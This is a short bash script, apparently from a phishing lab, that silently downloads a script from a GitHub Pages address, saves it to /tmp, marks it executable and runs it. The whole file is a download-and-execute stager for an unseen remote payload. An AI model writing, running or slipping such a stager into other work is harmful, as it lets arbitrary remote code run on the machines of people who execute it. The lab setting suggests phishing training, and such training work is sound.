#!/bin/bash

URL="https://albertocontador98.github.io/phishing-lab/calc.sh"
TEMPFILE="/tmp/calc.sh"

curl -sL "$URL" -o "$TEMPFILE"

chmod +x "$TEMPFILE"
"$TEMPFILE"
